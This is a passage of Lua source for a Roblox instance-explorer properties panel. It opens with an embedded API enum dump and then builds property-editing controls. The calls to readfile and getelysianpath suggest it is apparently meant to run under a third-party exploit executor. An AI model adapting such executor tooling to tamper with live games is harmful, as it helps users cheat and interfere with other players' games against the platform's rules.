Item","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]
			return rawApiJson
		end

		function getCurrentApiJson()
			local jsonStr = nil
			if readfile and getelysianpath then
				if readfile(getelysianpath().."Xpl0rerApi.txt") then
					print("Api found in folder!")
					jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
					return jsonStr
				end
			end
			local success, err = pcall(function()
				jsonStr = httpGet(apiUrl)
				print("Fetched json successfully")
			end)
			if success then
				print("Returning json")
				--print(jsonStr:sub(1,500))
				return jsonStr
			else
				print("Error fetching json: " .. tostring(err))
				print("Falling back to local copy")
				return getLocalApiJson()
			end
		end

		function splitStringIntoChunks(jsonStr)
			-- Splits up a string into a table with a given size
			local t = {}
			for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
				local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
				table.insert(t, str)
			end
			return t
		end

		local jsonToParse = getCurrentApiJson()
		local apiChunks = splitStringIntoChunks(jsonToParse)

		function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

			-- Services
			local HttpService = game:GetService("HttpService")
			local ServerStorage = game:GetService("ServerStorage")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")

			-- Remotes
			--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
			--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

			-- Functions
			local JsonDecode = function(s) return HttpService:JSONDecode(s) end

			local function GetApiRemoteFunction(index)
				if (apiChunks[index]) then 
					return apiChunks[index], #apiChunks
				else
					print("Bad index for GetApiJson")
					return nil
				end
			end

			local function getApiJson()
				local apiTable = {}
				local firstPage, pageCount = GetApiRemoteFunction(1)
				table.insert(apiTable, firstPage)
				for i = 2, pageCount do
					--print("Fetching API page # " .. tostring(i))
					local result = GetApiRemoteFunction(i)
					table.insert(apiTable, result)
				end
				return table.concat(apiTable)
			end

			local json = getApiJson()
			local apiDump =  JsonDecode(json)

			local Classes = {}
			local Enums = {}

			local function sortAlphabetic(t, property)
				table.sort(t, 
					function(x,y) return x[property] < y[property]
					end)
			end

			local function isEnum(name)
				return Enums[name] ~= nil
			end

			local function getProperties(className)
				local class = Classes[className]
				local properties = {}

				if not class then return properties end

				while class do
					for _,property in pairs(class.Properties) do
						table.insert(properties, property)
					end
					class = Classes[class.Superclass]
				end

				sortAlphabetic(properties, "Name")

				return properties
			end

			for _,item in pairs(apiDump) do
				local itemType = item.type
				-- Classes --
				if (itemType == 'Class') then
					Classes[item.Name] = item
					item.Properties = {}
					item.Functions = {}
					item.YieldFunctions = {}
					item.Events = {}
					item.Callbacks = {}
					-- Members --
				elseif (itemType == 'Property') then
					table.insert(Classes[item.Class].Properties, item)
				elseif (itemType == 'Function') then
					table.insert(Classes[item.Class].Functions, item)
				elseif (itemType == 'YieldFunction') then
					table.insert(Classes[item.Class].YieldFunctions, item)
				elseif (itemType == 'Event') then
					table.insert(Classes[item.Class].Events, item)
				elseif (itemType == 'Callback') then
					table.insert(Classes[item.Class].Callbacks, item)
					-- Enums --
				elseif (itemType == 'Enum') then
					Enums[item.Name] = item
					item.EnumItems = {}
				elseif (itemType == 'EnumItem') then
					Enums[item.Enum].EnumItems[item.Name] = item
				end
			end

			return {
				Classes = Classes;
				Enums = Enums;
				GetProperties = getProperties;
				IsEnum = isEnum;
			}
		end

		-- Modules
		local Permissions = {CanEdit = true}
		local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

		-- Styles

		local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

		local Styles = {
			Font = Enum.Font.Arial;
			Margin = 5;
			Black = CreateColor3(0,0,0);
			White = CreateColor3(255,255,255);
		}

		local Row = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextXAlignment = Enum.TextXAlignment.Left;
			TextColor = Styles.Black;
			TextColorOver = Styles.White;
			TextLockedColor = CreateColor3(120,120,120);
			Height = 24;
			BorderColor = CreateColor3(216,216,216);
			BackgroundColor = Styles.White;
			BackgroundColorAlternate = CreateColor3(246,246,246);
			BackgroundColorMouseover = CreateColor3(211,224,244);
			TitleMarginLeft = 15;
		}

		local DropDown = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextColor = CreateColor3(0,0,0);
			TextColorOver = Styles.White;
			TextXAlignment = Enum.TextXAlignment.Left;
			Height = 16;
			BackColor = Styles.White;
			BackColorOver = CreateColor3(86,125,188);
			BorderColor = CreateColor3(216,216,216);
			BorderSizePixel = 2;
			ArrowColor = CreateColor3(160,160,160);
			ArrowColorOver = Styles.Black;
		}

		local BrickColors = {
			BoxSize = 13;
			BorderSizePixel = 1;
			BorderColor = CreateColor3(160,160,160);
			FrameColor = CreateColor3(160,160,160);
			Size = 20;
			Padding = 4;
			ColorsPerRow = 8;
			OuterBorder = 1;
			OuterBorderColor = Styles.Black;
		}

		wait(1)

		local Gui = D_E_X
		local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
		local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

		local bindGetSelection = ExplorerFrame.GetSelection
		local bindSelectionChanged = ExplorerFrame.SelectionChanged
		local bindGetApi = PropertiesFrame.GetApi
		local bindGetAwait = PropertiesFrame.GetAwaiting
		local bindSetAwait = PropertiesFrame.SetAwaiting

		local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

		local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

		local propertiesSearch = PropertiesFrame.Header.TextBox

		local AwaitingObjectValue = false
		local AwaitingObjectObj
		local AwaitingObjectProp

		function searchingProperties()
			if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
				return true
			end
			return false
		end

		local function GetSelection()
			local selection = bindGetSelection:Invoke()
			if #selection == 0 then
				return nil
			else
				return selection
			end 
		end

		-- Number

		local function Round(number, decimalPlaces)
			return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
		end

		-- Strings

		local function Split(str, delimiter)
			local start = 1
			local t = {}
			while true do
				local pos = string.find (str, delimiter, start, true)
				if not pos then
					break
				end
				table.insert (t, string.sub (str, start, pos - 1))
				start = pos + string.len (delimiter)
			end
			table.insert (t, string.sub (str, start))
			return t
		end

		-- Data Type Handling

		local function ToString(value, type)
			if type == "float" then
				return tostring(Round(value,2))
			elseif type == "Content" then
				if string.find(value,"/asset") then
					local match = string.find(value, "=") + 1
					local id = string.sub(value, match)
					return id
				else
					return tostring(value)
				end
			elseif type == "Vector2" then
				local x = value.x
				local y = value.y
				return string.format("%g, %g", x,y)
			elseif type == "Vector3" then
				local x = value.x
				local y = value.y
				local z = value.z
				return string.format("%g, %g, %g", x,y,z)
			elseif type == "Color3" then
				local r = value.r
				local g = value.g
				local b = value.b
				return string.format("%d, %d, %d", r*255,g*255,b*255)
			elseif type == "UDim2" then
				local xScale = value.X.Scale
				local xOffset = value.X.Offset
				local yScale = value.Y.Scale
				local yOffset = value.Y.Offset
				return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
			else
				return tostring(value)
			end
		end

		local function ToValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Content" then
				if tonumber(value) ~= nil then
					value = ContentUrl .. value
				end
				return value
			elseif type == "float" or type == "int" or type == "double" then
				return tonumber(value)
			elseif type == "string" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			else
				return nil
			end
		end


		-- Tables

		local function CopyTable(T)
			local t2 = {}
			for k,v in pairs(T) do
				t2[k] = v
			end
			return t2
		end

		local function SortTable(T)
			table.sort(T, 
				function(x,y) return x.Name < y.Name
				end)
		end

		-- Spritesheet
		local Sprite = {
			Width = 13;
			Height = 13;
		}

		local Spritesheet = {
			Image = "http://www.roblox.com/asset/?id=128896947";
			Height = 256;
			Width = 256;
		}

		local Images = {
			"unchecked",
			"checked",
			"unchecked_over",
			"checked_over",
			"unchecked_disabled",
			"checked_disabled"
		}

		local function SpritePosition(spriteName)
			local x = 0
			local y = 0
			for i,v in pairs(Images) do
				if (v == spriteName) then
					return {x, y}
				end
				x = x + Sprite.Height
				if (x + Sprite.Width) > Spritesheet.Width then
					x = 0
					y = y + Sprite.Height
				end
			end
		end

		local function GetCheckboxImageName(checked, readOnly, mouseover)
			if checked then
				if readOnly then
					return "checked_disabled"
				elseif mouseover then
					return "checked_over"
				else
					return "checked"
				end
			else
				if readOnly then
					return "unchecked_disabled"
				elseif mouseover then
					return "unchecked_over"
				else
					return "unchecked"
				end
			end
		end

		local MAP_ID = 418720155

		-- Gui Controls --

		---- IconMap ----
		-- Image size: 256px x 256px
		-- Icon size: 16px x 16px
		-- Padding between each icon: 2px
		-- Padding around image edge: 1px
		-- Total icons: 14 x 14 (196)
		local Icon do
			local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
			game:GetService('ContentProvider'):Preload(iconMap)
			local iconDehash do
				-- 14 x 14, 0-based input, 0-based output
				local f=math.floor
				function iconDehash(h)
					return f(h/14%14),f(h%14)
				end
			end

			function Icon(IconFrame,index)
				local row,col = iconDehash(index)
				local mapSize = Vector2.new(256,256)
				local pad,border = 2,1
				local iconSize = 16

				local class = 'Frame'
				if type(IconFrame) == 'string' then
					class = IconFrame
					IconFrame = nil
				end

				if not IconFrame then
					IconFrame = Create(class,{
						Name = "Icon";
						BackgroundTransparency = 1;
						ClipsDescendants = true;
						Create('ImageLabel',{
							Name = "IconMap";
							Active = false;
							BackgroundTransparency = 1;
							Image = iconMap;
							Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
						});
					})
				end

				IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
				return IconFrame
			end
		end

		local function CreateCell()
			local tableCell = Instance.new("Frame")
			tableCell.Size = UDim2.new(0.5, -1, 1, 0)
			tableCell.BackgroundColor3 = Row.BackgroundColor
			tableCell.BorderColor3 = Row.BorderColor
			return tableCell
		end

		local function CreateLabel(readOnly)
			local label = Instance.new("TextLabel")
			label.Font = Row.Font
			label.FontSize = Row.FontSize
			label.TextXAlignment = Row.TextXAlignment
			label.BackgroundTransparency = 1

			if readOnly then
				label.TextColor3 = Row.TextLockedColor
			else
				label.TextColor3 = Row.TextColor
			end
			return label
		end

		local function CreateTextButton(readOnly, onClick)
			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			else
				button.TextColor3 = Row.TextColor
				button.MouseButton1Click:connect(function()
					onClick()
				end)
			end
			return button
		end

		local function CreateObject(readOnly)
			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			else
				button.TextColor3 = Row.TextColor
			end
			local cancel = Create(Icon('ImageButton',177),{
				Name = "Cancel";
				Visible = false;
				Position = UDim2.new(1,-20,0,0);
				Size = UDim2.new(0,20,0,20);
				Parent = button;
			})
			return button
		end

		local function CreateTextBox(readOnly)
			if readOnly then
				local box = CreateLabel(readOnly)
				return box
			else
				local box = Instance.new("TextBox")
				if not SettingsRemote:Invoke("ClearProps") then
					box.ClearTextOnFocus = false
				end
				box.Font = Row.Font
				box.FontSize = Row.FontSize
				box.TextXAlignment = Row.TextXAlignment
				box.BackgroundTransparency = 1
				box.TextColor3 = Row.TextColor
				return box
			end
		end

		local function CreateDropDownItem(text, onClick)
			local button = Instance.new("TextButton")
			button.Font = DropDown.Font
			button.FontSize = DropDown.FontSize
			button.TextColor3 = DropDown.TextColor
			button.TextXAlignment = DropDown.TextXAlignment
			button.BackgroundColor3 = DropDown.BackColor
			button.AutoButtonColor = false
			button.BorderSizePixel = 0
			button.Active = true
			button.Text = text

			button.MouseEnter:connect(function()
				button.TextColor3 = DropDown.TextColorOver
				button.BackgroundColor3 = DropDown.BackColorOver
			end)
			button.MouseLeave:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
			end)
			button.MouseButton1Click:connect(function()
				onClick(text)
			end)	
			return button
		end

		local function CreateDropDown(choices, currentChoice, readOnly, onClick)
			local frame = Instance.new("Frame")	
			frame.Name = "DropDown"
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			button.TextColor3 = Row.TextColor
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			end
			button.Text = currentChoice
			button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			button.Position = UDim2.new(0, Styles.Margin, 0, 0)
			button.Parent = frame

			local function showArrow(color)
				if arrow then arrow:Destroy() end

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = color;
				})
				local graphicSize = 16/2

				arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
				arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
				arrow.Parent = frame
			end

			local function hideMenu()
				expanded = false
				showArrow(DropDown.ArrowColor)
				if menu then menu:Destroy() end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("Frame")
				menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
				local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
				if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
					menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateDropDownItem(name, function()
						choice(name)
					end)
					option.Size = UDim2.new(1, 0, 0, 16)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end

			showArrow(DropDown.ArrowColor)

			if not readOnly then

				button.MouseEnter:connect(function()
					button.TextColor3 = Row.TextColor
					showArrow(DropDown.ArrowColorOver)
				end)
				button.MouseLeave:connect(function()
					button.TextColor3 = Row.TextColor
					if not expanded then
						showArrow(DropDown.ArrowColor)
					end
				end)
				button.MouseButton1Click:connect(function()
					if expanded then
						hideMenu()
					else
						showMenu()
					end
				end)
			end

			return frame,button
		end

		local function CreateBrickColor(readOnly, onClick)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1,0,1,0)
			frame.BackgroundTransparency = 1

			local colorPalette = Instance.new("Frame")
			colorPalette.BackgroundTransparency = 0
			colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
			colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
			colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
			colorPalette.BorderColor3 = BrickColors.BorderColor
			colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
			colorPalette.ZIndex = 5
			colorPalette.Visible = false
			colorPalette.BorderSizePixel = BrickColors.OuterBorder
			colorPalette.BorderColor3 = BrickColors.OuterBorderColor
			colorPalette.Parent = frame

			local function show()
				colorPalette.Visible = true
			end

			local function hide()
				colorPalette.Visible = false
			end

			local function toggle()
				colorPalette.Visible = not colorPalette.Visible
			end

			local colorBox = Instance.new("TextButton", frame)
			colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
			colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
			colorBox.Text = ""
			colorBox.MouseButton1Click:connect(function()
				if not readOnly then
					toggle()
				end
			end)

			if readOnly then
				colorBox.AutoButtonColor = false
			end

			local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize

			local propertyLabel = CreateTextButton(readOnly, function()
				if not readOnly then
					toggle()
				end
			end)
			propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
			propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
			propertyLabel.Parent = frame

			local size = (1 / BrickColors.ColorsPerRow)

			for index = 0, 127 do
				local brickColor = BrickColor.palette(index)
				local color3 = brickColor.Color

				local x = size * (index % BrickColors.ColorsPerRow)
				local y = size * math.floor(index / BrickColors.ColorsPerRow)

				local brickColorBox = Instance.new("TextButton")
				brickColorBox.Text = ""
				brickColorBox.Size = UDim2.new(size,0,size,0)
				brickColorBox.BackgroundColor3 = color3
				brickColorBox.Position = UDim2.new(x, 0, y, 0)
				brickColorBox.ZIndex = colorPalette.ZIndex
				brickColorBox.Parent = colorPalette

				brickColorBox.MouseButton1Click:connect(function()
					hide()
					onClick(brickColor)
				end)
			end

			return frame,propertyLabel,colorBox
		end

		local function CreateColor3Control(readOnly, onClick)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1,0,1,0)
			frame.BackgroundTransparency = 1

			local colorBox = Instance.new("TextButton", frame)
			colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
			colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
			colorBox.Text = ""
			colorBox.AutoButtonColor = false

			local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
			local box = CreateTextBox(readOnly)
			box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, spacingBefore, 0, 0)
			box.Parent = frame

			return frame,box,colorBox
		end

		function CreateCheckbox(value, readOnly, onClick)
			local checked = value
			local mouseover = false

			local checkboxFrame = Instance.new("ImageButton")
			checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
			checkboxFrame.BackgroundTransparency = 1
			checkboxFrame.ClipsDescendants = true
			--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

			local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
			spritesheetImage.Name = "SpritesheetImageLabel"
			spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
			spritesheetImage.Image = Spritesheet.Image
			spritesheetImage.BackgroundTransparency = 1

			local function updateSprite()
				local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
				local spritePosition = SpritePosition(spriteName)
				spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
			end

			local function setValue(val)
				checked = val
				updateSprite()
			end

			if not readOnly then
				checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
				checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
				checkboxFrame.MouseButton1Click:connect(function()
					onClick(checked)
				end)
			end

			updateSprite()

			return checkboxFrame, setValue
		end



		-- Code for handling controls of various data types --

		local Controls = {}

		Controls["default"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			local box = CreateTextBox(readOnly)
			box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, Styles.Margin, 0, 0)

			local function update()
				local value = object[propertyName]
				box.Text = ToString(value, propertyType)
			end

			if not readOnly then
				box.FocusLost:connect(function(enterPressed)
					Set(object, propertyData, ToValue(box.Text,propertyType))
					update()
				end)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return box
		end

		Controls["bool"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local checked = object[propertyName]

			local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
				Set(object, propertyData, not checked)
			end)
			checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

			setValue(checked)

			local function update()
				checked = object[propertyName]
				setValue(checked)
			end

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			if object:IsA("BoolValue") then
				object.Changed:connect(function(val)
					update()
				end)
			end

			update()

			return checkbox
		end

		Controls["BrickColor"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]

			local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
				Set(object, propertyData, brickColor)
			end)

			local function update()
				local value = object[propertyName]
				brickColorBox.BackgroundColor3 = value.Color
				label.Text = tostring(value)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return frame
		end

		Controls["Color3"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]

			local frame,textBox,colorBox = CreateColor3Control(readOnly)

			textBox.FocusLost:connect(function(enterPressed)
				Set(object, propertyData, ToValue(textBox.Text,"Color3"))
				local value = object[propertyName]
				colorBox.BackgroundColor3 = value
				textBox.Text = ToString(value, "Color3")
			end)

			local function update()
				local value = object[propertyName]
				colorBox.BackgroundColor3 = value
				textBox.Text = ToString(value, "Color3")
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return frame
		end

		Controls["Enum"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			local enumName = object[propertyName].Name

			local enumNames = {}
			for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
				table.insert(enumNames, enum.Name)
			end

			local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
				Set(object, propertyData, value)
			end)
